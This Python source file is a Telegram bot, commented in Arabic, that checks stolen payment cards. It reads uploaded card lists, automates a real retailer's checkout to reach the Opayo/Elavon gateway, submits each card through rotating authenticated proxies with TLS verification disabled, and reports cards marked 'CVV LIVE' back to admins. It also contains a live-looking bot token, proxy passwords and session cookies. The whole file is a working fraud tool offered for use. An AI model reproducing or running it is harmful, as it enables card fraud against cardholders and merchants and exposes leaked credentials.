import os
import asyncio
import threading
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
from bs4 import BeautifulSoup
import json
import random
import string
import time
import re
from urllib.parse import urljoin, urlparse, parse_qs, unquote
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== الإعدادات ==========
BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
ADMIN_IDS = [5895491379, 844663875]

# ========== Opayo Settings ==========
BASE = "https://www.rapidonline.com"
BASKET_URL = BASE + "/checkout/basket"
TOORDER_URL = BASE + "/checkout/basket/toorder"
PARAMS = {"pEx": "4"}
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

initial_cookies = {
    'lantern': 'acae1b5d-f800-4e2d-8364-1492a117d8c1',
    'wtstp_nv': '1',
    'wtstp_nv_s': '1',
    'wt_mcp_sid': '2802285916',
    'LPVID': 'IxZmZhMDIxYWNlNjkyNzdl',
    'LPSID-66449020': 'w51M_sGJTImLyqQzMUc-5Q',
    '.AspNet.Consent': 'yes',
    '_ra_func': 'true',
    '_ra_perf': 'true',
    '_ra_adv': 'true',
    '_ra_Initial': 'true',
    '_ga': 'GA1.1.932453915.1761758104',
    '__hstc': '57241397.72c5200adc9d6d8ebf2d8ae05e71125a.1761758106430.1761758106430.1761758106430.1',
    'hubspotutk': '72c5200adc9d6d8ebf2d8ae05e71125a',
    '__hssrc': '1',
    'CustomSearchUser': '20b5a52d-3c49-4540-bd99-834c3c36990e',
    'ra_Vat': 'false',
    'ra_NewType': '1',
    'Loop54User': 'ba495721-c02b-4464-9dc9-5b2a89c2af58',
    'ra_BAS': 'L3ZduBJfweo2kca9khjBJw%3D%3D',
    '.AspNetCore.Antiforgery.ewfMgV3Kz2g': 'CfDJ8IAvExQjoXNFuGlpY7xOM3RJzu-LaHt3ii3ADRgdoUH2nWn91Z-nGVVQb7zFGSnKrf4OKgLW_1sCCyJM3QAdF0_1V96pbpRy-2ZwyL6uKyz8QnMzqpbhEsxcIk2K2-KGkeBTknIKzJCy_HC7TlFc4ys',
    'ra_session': 'CfDJ8IAvExQjoXNFuGlpY7xOM3TJD4kqy8kVk6kVCtL1MaLncrAvGsYfuqvAKguiOqqIJ5nvChsN4WyCrXhVAOYEUoSvxN%2BhdhENvJ96YY1RhQ5TwZaSqC9ldGBNg6VqC0aaxR4Dv44R3jIzmMKkYD6VbGlf%2BK%2BdqAWgWCUp3e8Vz3UG',
}

# ========== قائمة البروكسيات ==========
PROXIES = [
    "82.21.224.53:6409:wikniadi:5nhj034pwe2b",
    "82.29.229.58:6413:wikniadi:5nhj034pwe2b",
    "82.25.216.252:7094:wikniadi:5nhj034pwe2b",
    "23.27.184.56:5657:wikniadi:5nhj034pwe2b",
    "23.27.138.191:6292:wikniadi:5nhj034pwe2b",
    "82.22.210.10:7852:wikniadi:5nhj034pwe2b",
    "23.27.184.66:5667:wikniadi:5nhj034pwe2b",
    "82.21.224.144:6500:wikniadi:5nhj034pwe2b",
    "23.27.138.3:6104:wikniadi:5nhj034pwe2b",
    "82.24.224.121:5477:wikniadi:5nhj034pwe2b",
    "23.27.138.52:6153:wikniadi:5nhj034pwe2b",
    "23.27.138.7:6108:wikniadi:5nhj034pwe2b",
    "82.25.216.253:7095:wikniadi:5nhj034pwe2b",
    "82.29.225.124:5979:wikniadi:5nhj034pwe2b",
    "82.29.225.234:6089:wikniadi:5nhj034pwe2b",
    "46.203.159.11:6612:wikniadi:5nhj034pwe2b",
    "23.27.184.19:5620:wikniadi:5nhj034pwe2b",
    "82.25.216.58:6900:wikniadi:5nhj034pwe2b",
    "82.29.229.17:6372:wikniadi:5nhj034pwe2b",
    "82.29.225.147:6002:wikniadi:5nhj034pwe2b",
    "82.25.216.82:6924:wikniadi:5nhj034pwe2b",
    "82.29.225.162:6017:wikniadi:5nhj034pwe2b",
    "82.22.220.147:5502:wikniadi:5nhj034pwe2b",
    "82.29.226.49:7391:wikniadi:5nhj034pwe2b",
    "82.22.217.78:5420:wikniadi:5nhj034pwe2b",
    "82.29.226.142:7484:wikniadi:5nhj034pwe2b",
    "23.27.184.34:5635:wikniadi:5nhj034pwe2b",
    "82.22.210.191:8033:wikniadi:5nhj034pwe2b",
    "46.203.159.219:6820:wikniadi:5nhj034pwe2b",
    "82.24.224.176:5532:wikniadi:5nhj034pwe2b",
    "82.24.224.214:5570:wikniadi:5nhj034pwe2b",
    "82.29.226.141:7483:wikniadi:5nhj034pwe2b",
    "23.27.138.141:6242:wikniadi:5nhj034pwe2b",
    "46.203.159.243:6844:wikniadi:5nhj034pwe2b",
    "82.29.225.96:5951:wikniadi:5nhj034pwe2b",
    "23.27.138.4:6105:wikniadi:5nhj034pwe2b",
    "82.21.224.55:6411:wikniadi:5nhj034pwe2b",
    "23.27.138.174:6275:wikniadi:5nhj034pwe2b",
    "82.22.220.98:5453:wikniadi:5nhj034pwe2b",
    "82.25.216.243:7085:wikniadi:5nhj034pwe2b",
    "23.27.184.65:5666:wikniadi:5nhj034pwe2b",
    "82.21.224.157:6513:wikniadi:5nhj034pwe2b",
    "23.27.184.126:5727:wikniadi:5nhj034pwe2b",
    "82.22.220.19:5374:wikniadi:5nhj034pwe2b",
    "66.63.180.86:5610:wikniadi:5nhj034pwe2b",
    "82.29.225.186:6041:wikniadi:5nhj034pwe2b",
    "82.27.214.80:6422:wikniadi:5nhj034pwe2b",
    "82.21.224.4:6360:wikniadi:5nhj034pwe2b",
    "82.22.210.232:8074:wikniadi:5nhj034pwe2b",
    "23.27.138.106:6207:wikniadi:5nhj034pwe2b",
    "82.29.226.36:7378:wikniadi:5nhj034pwe2b",
    "82.29.226.25:7367:wikniadi:5nhj034pwe2b",
    "82.29.226.157:7499:wikniadi:5nhj034pwe2b",
    "82.22.217.47:5389:wikniadi:5nhj034pwe2b",
    "82.24.224.150:5506:wikniadi:5nhj034pwe2b",
    "82.27.214.169:6511:wikniadi:5nhj034pwe2b",
    "82.29.226.160:7502:wikniadi:5nhj034pwe2b",
    "82.21.224.129:6485:wikniadi:5nhj034pwe2b",
    "23.27.138.102:6203:wikniadi:5nhj034pwe2b",
    "82.22.217.21:5363:wikniadi:5nhj034pwe2b",
    "82.29.225.57:5912:wikniadi:5nhj034pwe2b",
    "82.22.217.251:5593:wikniadi:5nhj034pwe2b",
    "82.25.216.216:7058:wikniadi:5nhj034pwe2b",
    "46.203.159.236:6837:wikniadi:5nhj034pwe2b",
    "82.22.210.148:7990:wikniadi:5nhj034pwe2b",
    "82.22.210.117:7959:wikniadi:5nhj034pwe2b",
    "82.21.224.110:6466:wikniadi:5nhj034pwe2b",
    "82.22.217.246:5588:wikniadi:5nhj034pwe2b",
    "23.27.184.248:5849:wikniadi:5nhj034pwe2b",
    "46.203.159.89:6690:wikniadi:5nhj034pwe2b",
    "46.203.159.145:6746:wikniadi:5nhj034pwe2b",
    "82.27.214.125:6467:wikniadi:5nhj034pwe2b",
    "82.22.220.158:5513:wikniadi:5nhj034pwe2b",
    "82.22.217.234:5576:wikniadi:5nhj034pwe2b",
    "82.22.220.208:5563:wikniadi:5nhj034pwe2b",
    "82.22.210.222:8064:wikniadi:5nhj034pwe2b",
    "82.25.216.172:7014:wikniadi:5nhj034pwe2b",
    "82.25.216.37:6879:wikniadi:5nhj034pwe2b",
    "82.29.225.168:6023:wikniadi:5nhj034pwe2b",
    "82.24.224.238:5594:wikniadi:5nhj034pwe2b",
    "82.25.216.201:7043:wikniadi:5nhj034pwe2b",
    "23.27.138.224:6325:wikniadi:5nhj034pwe2b",
    "82.21.224.116:6472:wikniadi:5nhj034pwe2b",
    "82.22.220.43:5398:wikniadi:5nhj034pwe2b",
    "82.29.225.240:6095:wikniadi:5nhj034pwe2b",
    "82.21.224.119:6475:wikniadi:5nhj034pwe2b",
    "82.24.224.202:5558:wikniadi:5nhj034pwe2b",
    "82.22.210.91:7933:wikniadi:5nhj034pwe2b",
    "82.22.210.79:7921:wikniadi:5nhj034pwe2b",
    "82.29.226.220:7562:wikniadi:5nhj034pwe2b",
    "23.27.184.224:5825:wikniadi:5nhj034pwe2b",
    "82.21.224.251:6607:wikniadi:5nhj034pwe2b",
    "82.29.225.230:6085:wikniadi:5nhj034pwe2b",
    "23.27.184.40:5641:wikniadi:5nhj034pwe2b",
    "23.27.184.77:5678:wikniadi:5nhj034pwe2b",
    "82.29.226.113:7455:wikniadi:5nhj034pwe2b",
    "82.22.217.83:5425:wikniadi:5nhj034pwe2b",
    "66.63.180.183:5707:wikniadi:5nhj034pwe2b",
    "82.27.214.77:6419:wikniadi:5nhj034pwe2b",
    "82.24.224.249:5605:wikniadi:5nhj034pwe2b"
]

def get_random_proxy():
    """اختيار بروكسي عشوائي"""
    proxy_line = random.choice(PROXIES)
    parts = proxy_line.split(':')
    ip, port, user, password = parts[0], parts[1], parts[2], parts[3]
    proxy_url = f"http://{user}:{password}@{ip}:{port}"
    return {
        'http': proxy_url,
        'https': proxy_url
    }

# ========== إحصائيات ==========
stats = {
    'total': 0,
    'checking': 0,
    'approved': 0,
    'ccn': 0,
    'declined': 0,
    'errors': 0,
    'start_time': None,
    'is_running': False,
    'dashboard_message_id': None,
    'chat_id': None,
    'current_card': '',
    'error_details': {},
    'last_response': 'Waiting...',
    'cards_checked': 0,
    'approved_cards': [],
    'ccn_cards': [],
    'current_proxy': ''
}

# ========== Opayo Functions ==========
def analyze_response(html_content):
    """تحليل الاستجابة وإرجاع الحالة"""
    html_lower = html_content.lower()
    
    if 'paymentauthenticationchallenge' in html_lower or 'action="https://hk.paymentauthenticationchallenge' in html_lower:
        return "CCN", "3D Secure Challenge Required"
    
    if 'your payment is being authorised' in html_lower or 'opayo - authorisation' in html_lower:
        return "APPROVED", "Payment Approved - CVV LIVE"
    
    if '3d-authentication failed' in html_lower and 'rejected by the issuer' in html_lower:
        return "DECLINED", "3D Authentication Failed"
    
    if 'card expiry date is invalid' in html_lower:
        return "ERROR", "Invalid Expiry Date"
    
    if 'the card number is not valid' in html_lower:
        return "ERROR", "Invalid Card Number"
    
    if 'security code' in html_lower and 'invalid' in html_lower:
        return "ERROR", "Invalid CVV"
    
    if 'error processing transaction' in html_lower or 'server error' in html_lower:
        return "ERROR", "Transaction Error"
    
    return "UNKNOWN", "Unknown Response"

def get_opayo_cookies(proxy_dict):
    """استخراج كوكيز Opayo من التدفق"""
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Referer": "https://www.rapidonline.com/checkout/order/redirect?pEx=4"})
    s.cookies.update(initial_cookies)
    s.proxies = proxy_dict
    
    try:
        r = s.get(BASKET_URL, params=PARAMS, timeout=30)
        soup = BeautifulSoup(r.text, "html.parser")
        
        uid = (soup.find("input", {"name": "UniqueRequestId"}) or {}).get("value")
        token = (soup.find("input", {"name": "__RequestVerificationToken"}) or {}).get("value")
        
        if not uid:
            m = re.search(r'name=["\']UniqueRequestId["\'][^>]*value=["\']([0-9a-f-]{36})["\']', r.text, re.I|re.S)
            uid = m.group(1) if m else None
        if not token:
            m = re.search(r'name=["\']__RequestVerificationToken["\'][^>]*value=["\']([^"\']+)["\']', r.text, re.I|re.S)
            token = m.group(1) if m else None
        
        if not uid or not token:
            return None
        
        headers_post = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": BASE,
            "referer": f"{BASKET_URL}?pEx=4",
            "x-requested-with": "XMLHttpRequest",
            "requestverificationtoken": token,
            "User-Agent": UA,
        }
        payload = {
            "CustomerOrderNumber": "",
            "ScheduleDate": "",
            "UniqueRequestId": uid,
            "PaymentProvider": "1",
            "Misc": "",
        }
        r2 = s.post(TOORDER_URL, headers=headers_post, data=payload, timeout=30, allow_redirects=False)
        
        redirect_url = None
        try:
            j = r2.json()
            redirect_url = j.get("RedirectUrl") if isinstance(j, dict) else None
        except Exception:
            pass
        if not redirect_url:
            redirect_url = r2.headers.get("Location")
        
        if not redirect_url:
            return None
        
        if redirect_url.startswith("/"):
            redirect_url = urljoin(BASE, redirect_url)
        
        qs = parse_qs(urlparse(redirect_url).query)
        if "paymenturl" in qs:
            opayo_url = unquote(qs["paymenturl"][0])
        else:
            opayo_url = redirect_url
        
        s.get(opayo_url, allow_redirects=True, timeout=30, verify=False)
        s.get("https://live.opayo.eu.elavon.com/gateway/service/carddetails", 
              headers={"Referer": opayo_url, "Origin": "https://live.opayo.eu.elavon.com"}, 
              allow_redirects=True, timeout=30, verify=False)
        
        wanted = "live.opayo.eu.elavon.com"
        def domain_match(cd, wd=wanted):
            if not cd: return False
            cd = cd.lstrip(".").lower(); wd = wd.lstrip(".").lower()
            return cd == wd or cd.endswith("."+wd)
        
        cookies = {c.name: c.value for c in s.cookies if domain_match(c.domain)}
        if not cookies:
            cookies = {c.name: c.value for c in s.cookies}
        
        return cookies
        
    except Exception as e:
        print(f"[!] خطأ في استخراج الكوكيز: {e}")
        return None

# ========== 🔥 إرسال النتائج في المحادثة ==========
async def send_result(bot_app, chat_id, card, status_type, message):
    """إرسال نتيجة مباشرة في نفس المحادثة"""
    try:
        card_number = stats['approved'] + stats['ccn']
        
        if status_type == 'APPROVED':
            text = (
                "╔═══════════════╗\n"
                "✅ **APPROVED CARD LIVE** ✅\n"
                "╚═══════════════╝\n\n"
                f"💳 `{card}`\n"
                f"🔥 Status: **CVV LIVE - Approved**\n"
                f"📊 Card #{card_number}\n"
                f"🌐 Proxy: {stats['current_proxy']}\n"
                f"⚡️ Opayo Gateway\n"
                "╚═══════════════╝"
            )
            stats['approved_cards'].append(card)
            
        elif status_type == 'CCN':
            text = (
                "╔═══════════════╗\n"
                "⚠️ **CCN CARD (3D SECURE)** ⚠️\n"
                "╚═══════════════╝\n\n"
                f"💳 `{card}`\n"
                f"🔥 Status: **3D Secure Challenge**\n"
                f"📊 Card #{card_number}\n"
                f"🌐 Proxy: {stats['current_proxy']}\n"
                f"⚡️ Opayo Gateway\n"
                "╚═══════════════╝"
            )
            stats['ccn_cards'].append(card)
        else:
            return
        
        await bot_app.bot.send_message(
            chat_id=chat_id,
            text=text,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"[!] خطأ في إرسال رسالة: {e}")

# ========== فحص البطاقة ==========
async def check_card(card, bot_app, chat_id):
    parts = card.strip().split('|')
    if len(parts) != 4:
        stats['errors'] += 1
        stats['error_details']['FORMAT_ERROR'] = stats['error_details'].get('FORMAT_ERROR', 0) + 1
        stats['checking'] -= 1
        stats['last_response'] = 'Format Error'
        await update_dashboard(bot_app, chat_id)
        return card, "ERROR", "صيغة خاطئة"
    
    card_number, exp_month, exp_year, cvv = parts
    card_number = card_number.strip()
    exp_month = exp_month.strip().zfill(2)
    exp_year = exp_year.strip()
    
    if len(exp_year) == 4:
        exp_year = exp_year[-2:]
    
    cvv = cvv.strip()
    
    # Get random proxy
    proxy_dict = get_random_proxy()
    stats['current_proxy'] = list(proxy_dict.values())[0].split('@')[1] if proxy_dict else 'No Proxy'
    
    # Get fresh cookies with proxy
    opayo_cookies = get_opayo_cookies(proxy_dict)
    if not opayo_cookies:
        stats['errors'] += 1
        stats['error_details']['COOKIE_ERROR'] = stats['error_details'].get('COOKIE_ERROR', 0) + 1
        stats['checking'] -= 1
        stats['last_response'] = 'Cookie Error'
        await update_dashboard(bot_app, chat_id)
        return card, "ERROR", "فشل في استخراج الكوكيز"
    
    headers_card = {
        'Host': 'live.opayo.eu.elavon.com',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Chromium";v="141", "Not?A_Brand";v="8"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'https://live.opayo.eu.elavon.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': UA,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'iframe',
        'Referer': 'https://live.opayo.eu.elavon.com/gateway/service/carddetails',
        'Priority': 'u=0, i',
    }
    
    data_card = {
        'browserJavaEnabled': 'false',
        'browserColorDepth': '24',
        'browserScreenHeight': '786',
        'browserScreenWidth': '1397',
        'browserTZ': '-180',
        'challengeWindowSize': '05',
        'cardholder': 'details saad',
        'cardnumber': card_number,
        'expirymonth': exp_month,
        'expiryyear': exp_year,
        'securitycode': cvv,
        'action': 'proceed',
    }
    
    try:
        response = requests.post(
            'https://live.opayo.eu.elavon.com/gateway/service/carddetails',
            cookies=opayo_cookies,
            headers=headers_card,
            data=data_card,
            proxies=proxy_dict,
            verify=False,
            timeout=30
        )
        
        status, message = analyze_response(response.text)
        
        if status == "APPROVED":
            stats['approved'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'Approved ✅'
            await update_dashboard(bot_app, chat_id)
            await send_result(bot_app, chat_id, card, "APPROVED", message)
            return card, "APPROVED", message
            
        elif status == "CCN":
            stats['ccn'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'CCN ⚠️'
            await update_dashboard(bot_app, chat_id)
            await send_result(bot_app, chat_id, card, "CCN", message)
            return card, "CCN", message
            
        elif status == "DECLINED":
            stats['declined'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'Declined ❌'
            await update_dashboard(bot_app, chat_id)
            return card, "DECLINED", message
            
        else:
            stats['errors'] += 1
            stats['error_details'][status] = stats['error_details'].get(status, 0) + 1
            stats['checking'] -= 1
            stats['last_response'] = f'{status}'
            await update_dashboard(bot_app, chat_id)
            return card, status, message
            
    except Exception as e:
        stats['errors'] += 1
        stats['error_details']['EXCEPTION'] = stats['error_details'].get('EXCEPTION', 0) + 1
        stats['checking'] -= 1
        stats['last_response'] = f'Error: {str(e)[:20]}'
        await update_dashboard(bot_app, chat_id)
        return card, "EXCEPTION", str(e)

# ========== Dashboard ==========
def create_dashboard_keyboard():
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    keyboard = [
        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
        [
            InlineKeyboardButton(f"🔄 يتم الفحص: {stats['checking']}", callback_data="checking"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
        ],
        [
            InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data="approved"),
            InlineKeyboardButton(f"⚠️ CCN: {stats['ccn']}", callback_data="ccn")
        ],
        [
            InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="declined"),
            InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")
        ],
        [
            InlineKeyboardButton(f"📡 Response: {stats['last_response']}", callback_data="response")
        ]
    ]
    
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
    
    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
    
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app, chat_id):
    """تحديث Dashboard"""
    if stats['dashboard_message_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=chat_id,
                message_id=stats['dashboard_message_id'],
                text="📊 **OPAYO CARD CHECKER - LIVE WITH PROXIES** 📊",
                reply_markup=create_dashboard_keyboard(),
                parse_mode='Markdown'
            )
        except:
            pass

# ========== 🔥 إنشاء الملفات النهائية ==========
async def send_final_files(bot_app, chat_id):
    """إرسال ملفات txt للبطاقات المقبولة"""
    try:
        if stats['approved_cards']:
            approved_text = "\n".join(stats['approved_cards'])
            with open("approved_cards.txt", "w") as f:
                f.write(approved_text)
            await bot_app.bot.send_document(
                chat_id=chat_id,
                document=open("approved_cards.txt", "rb"),
                caption=f"✅ **Approved Cards (CVV LIVE)** ({len(stats['approved_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove("approved_cards.txt")
        
        if stats['ccn_cards']:
            ccn_text = "\n".join(stats['ccn_cards'])
            with open("ccn_cards.txt", "w") as f:
                f.write(ccn_text)
            await bot_app.bot.send_document(
                chat_id=chat_id,
                document=open("ccn_cards.txt", "rb"),
                caption=f"⚠️ **CCN Cards (3D Secure)** ({len(stats['ccn_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove("ccn_cards.txt")
        
    except Exception as e:
        print(f"[!] خطأ في إرسال الملفات: {e}")

# ========== معالجات البوت ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return
    
    await update.message.reply_text(
        "📊 **OPAYO CARD CHECKER BOT WITH PROXIES**\n\n"
        "أرسل ملف .txt يحتوي على البطاقات\n"
        "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
        "✅ سيتم عرض النتائج هنا مباشرة\n"
        "🌐 كل طلب سيستخدم بروكسي عشوائي\n"
        f"📡 عدد البروكسيات المتاحة: {len(PROXIES)}",
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح")
        return
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ يوجد فحص جاري!")
        return
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
    
    stats.update({
        'total': len(cards),
        'checking': 0,
        'approved': 0,
        'ccn': 0,
        'declined': 0,
        'errors': 0,
        'current_card': '',
        'error_details': {},
        'last_response': 'Starting...',
        'cards_checked': 0,
        'approved_cards': [],
        'ccn_cards': [],
        'current_proxy': '',
        'start_time': datetime.now(),
        'is_running': True,
        'chat_id': update.effective_chat.id
    })
    
    dashboard_msg = await update.message.reply_text(
        "📊 **OPAYO CARD CHECKER - LIVE WITH PROXIES** 📊",
        reply_markup=create_dashboard_keyboard(),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    await update.message.reply_text(
        f"✅ تم بدء الفحص!\n\n"
        f"📊 إجمالي البطاقات: {len(cards)}\n"
        f"🌐 البروكسيات المتاحة: {len(PROXIES)}\n"
        f"📢 تابع النتائج أدناه",
        parse_mode='Markdown'
    )
    
    def run_checker():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(process_cards(cards, context.application, update.effective_chat.id))
        loop.close()
    
    threading.Thread(target=run_checker, daemon=True).start()

async def process_cards(cards, bot_app, chat_id):
    """معالجة البطاقات"""
    for i, card in enumerate(cards):
        if not stats['is_running']:
            break
        
        stats['checking'] = 1
        parts = card.split('|')
        stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
        await update_dashboard(bot_app, chat_id)
        
        await check_card(card, bot_app, chat_id)
        stats['cards_checked'] += 1
        
        if stats['cards_checked'] % 5 == 0:
            await update_dashboard(bot_app, chat_id)
        
        await asyncio.sleep(2)
    
    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_card'] = ''
    stats['last_response'] = 'Completed ✅'
    await update_dashboard(bot_app, chat_id)
    
    summary_text = (
        "═══════════════════\n"
        "✅ **اكتمل الفحص!** ✅\n"
        "═══════════════════\n\n"
        f"📊 **الإحصائيات النهائية:**\n"
        f"🔥 الإجمالي: {stats['total']}\n"
        f"✅ Approved (CVV LIVE): {stats['approved']}\n"
        f"⚠️ CCN (3D Secure): {stats['ccn']}\n"
        f"❌ Declined: {stats['declined']}\n"
        f"⚠️ Errors: {stats['errors']}\n\n"
        "📁 **جاري إرسال الملفات...**"
    )
    
    await bot_app.bot.send_message(
        chat_id=chat_id,
        text=summary_text,
        parse_mode='Markdown'
    )
    
    await send_final_files(bot_app, chat_id)
    
    final_text = (
        "╔═══════════════════╗\n"
        "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
        "╚═══════════════════╝\n\n"
        "✅ تم إرسال جميع الملفات\n"
        "📊 شكراً لاستخدامك البوت!\n\n"
        "⚡️ Opayo Gateway with Random Proxies"
    )
    
    await bot_app.bot.send_message(
        chat_id=chat_id,
        text=final_text,
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ غير مصرح", show_alert=True)
        return
    
    await query.answer()
    
    if query.data == "stop_check":
        stats['is_running'] = False
        await update_dashboard(context.application, query.message.chat_id)
        await query.message.reply_text("🛑 تم إيقاف الفحص!")

def main():
    print("[🤖] Starting Opayo Telegram Bot with Random Proxies...")
    print(f"[🌐] Loaded {len(PROXIES)} proxies")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("[✅] Bot is running with proxy rotation...")
    app.run_polling()

if __name__ == "__main__":
    main()
